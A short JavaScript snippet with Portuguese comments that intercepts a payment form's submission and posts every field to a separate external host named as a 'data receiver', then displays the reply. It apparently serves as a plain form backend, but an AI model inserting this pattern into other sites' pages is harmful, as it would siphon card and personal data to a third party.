document.getElementById('paymentForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const formData = new FormData(this);

    fetch('https://recebedor-dados.onrender.com/submit', {  // URL do segundo site
        method: 'POST',
        body: new URLSearchParams(formData)
    })
    .then(response => response.text())
    .then(result => {
        document.getElementById('resultado').textContent = result;
    })
    .catch(error => {
        console.error('Erro:', error);
        document.getElementById('resultado').textContent = 'Erro ao enviar os dados.';
    });
});
